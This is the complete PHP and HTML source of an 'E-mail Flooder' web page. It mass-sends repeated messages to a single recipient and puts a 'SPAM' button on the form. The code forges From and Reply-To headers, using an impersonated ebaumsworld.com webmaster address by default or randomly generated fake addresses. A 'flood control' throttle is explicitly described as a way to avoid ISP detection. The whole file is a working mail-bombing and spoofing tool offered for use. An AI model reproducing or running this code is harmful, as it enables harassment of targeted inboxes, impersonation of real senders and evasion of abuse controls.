<html>
  <head>
<style type="text/css">
.header
{
 background-color: #ffccaa;
}

.cell1
{
 background-color: #ffeeca;
 width: 50%;
}

.cell2
{
  background-color: #ffeeca;
}

body
{
  font: normal 0.8em Verdana, sans-serif;
  background-color: #FFFFEE;
}

smalltext
{
 font: normal .8em Verdana, sans-serif;
}
</style>
<script language="javascript" type="text/javascript">
function randclick()
        {
         var random = document.getElementById('randbox').checked;
         document.getElementById('frombox').disabled = random;
         document.getElementById('replybox').disabled = random;
        }
function floodc()
        {
            var fc = document.getElementById('floodbox').checked;
            if(!fc)
            {
             alert("Turning flood control off almost guarantees detection and action by your ISP.\nOnly turn this off if you are SURE it's okay with your ISP to send the amount of e-mail you plan to send.");
            }
        }
</script>
  <title>E-mail Flooder</title>
  </head>
    <body>
<center>
<h3>Requires an SMTP and Web server</h3>
<?


function randomEmail()
{
 // returns a random, spoofed e-mail address.
 // pick two numbers, one in
 // [6-10] range, one in [4-20] range, and a random domain.
 // for each #, generate that many random letters/numbers, splice together.
 $usernum = rand(3,10);
 $domainnum = rand(4,10);
 $userstr="";
 $domainstr="";
 for($u=0;$u<$usernum;$u++)
 {
  // random letter of alphabet.
  $ranletter = chr( ord("a") + rand(0, 25) );
  $userstr.=$ranletter;
 }

 for($d=0;$d<$domainnum;$d++)
 {
  // random letter of alphabet.
  $ranletter = chr( ord("a") + rand(0, 25) );
  $domainstr.=$ranletter;
 }

 $email = "$userstr@$domainstr.com";
 return $email;

}


$action =$_POST["submit"];

if($action!=" SPAM ")
{

?>
  <form method="post" action="?" name="inputpanel">
    <table border="1" cellpadding="2">
          <tr>
            <td colspan="2" class="header">
            <p align="center" style="color: ; font-size: 1.5em">E-Mail Flooder</td>
          </tr>
          <tr>
            <td class="cell1">
            <p align="right"><b>Subject:</b></td>
            <td class="cell2">
                <input name="subject" size="30"/>
            </td>
          </tr>
          <tr>
            <td colspan="2" class="cell1">
                <p align="center">
                   <b>Message to send:</b>
               </p>
            </td>
          </tr>
          <tr>
            <td colspan="2" class="cell2">
            <p align="center">
               <textarea rows="6" cols="55" name="message" class="inputbox" style="overflow:scroll"></textarea></td>
            </p>
          </tr>
          <tr>
            <td class="cell1">
            <p align="right"><b>To:</b></td>
            <td class="cell2">
                <input name="emailto" size="30"/>
            </td>
          </tr>
          <tr>
            <td class="cell1">
            <p align="right"><b>From:</b></td>
            <td class="cell2">
                <input name="emailfrom" id="frombox" size="30" value="webmaster@ebaumsworld.com" /><br>
                <smalltext>Random</smalltext> <input type="checkbox" id="randbox" name="random" onClick="javascript:randclick();" value="ON">
            </td>
          </tr>
          <tr>
            <td class="cell1">
            <p align="right"><b>Reply-To:</b></td>
            <td class="cell2">
                <input name="emailreply" id="replybox" size="30" value="webmaster@ebaumsworld.com" />
            </td>
          </tr>
          <tr>
            <td class="cell1">
            <p align="right"><b>Number to Send:</b></td>
            <td class="cell2">
                <input name="emailquantity" size="5" maxlength="4" value="10" /><br>
                <smalltext>Flood Control</smalltext> <input type="checkbox" id="floodbox" name="floodcontrol" onClick="javascript:floodc();" value="ON" checked />
            </td>
          </tr>
          <tr>
            <td colspan="2" class="header">
            <p align="center"><input class="submit" type="submit" name="submit" value=" SPAM " /></td>
          </tr>
        </table>
  </form>

<?
}else
{
 $to = $_POST["emailto"];
 $from = $_POST["emailfrom"];
 $reply = $_POST["emailreply"];
 $subj = stripslashes($_POST["subject"]);
 $msg = stripslashes($_POST["message"]);
 $random = $_POST["random"];
 $quantity = $_POST["emailquantity"];
 $floodcontrol = $_POST["floodcontrol"];

 if($to==""||$subj==""||$msg=="")
 {
    echo "You must fill out the Subject, Message, and Recipient.<br>";
 }else
 {
   if(($from==""||$reply=="")&&$random!="ON")
   {
     echo "You must enter a sender and a reply-to address.<br>";
   }else
   {
    set_time_limit(0);
    // okay
    $counter=0;

    for($e=0;$e<$quantity;$e++)
    {
     if($random=="ON")
     {
         $r = randomEmail();
         $from = $r;
         $reply = $r;
     }

     // we're ready.

     $headers = "";
     $headers.="From: $from\r\n";
     $headers.="Reply-To: $from\r\n";
     $headers.="Return-Path: null\r\n";

     $sentaway = @mail($to,$subj,$msg,$headers);

     if($sentaway)
     {
      echo "Sent email <b>#$e</b> from <b>$from</b> to <b>$to</b><br>";
     }else
     {
      echo "<font color='red'>Couldn't send email <b>#$e</b></font><br>";
     }
    $counter++;
    if($counter==10&&$floodcontrol)
    {
     echo "Wait <u>5</u> seconds...<br>";
     $counter=0;
     sleep(5);
    }

    }

    set_time_limit(30);
   }
 }

}

?>

</center>
</body>
</html>
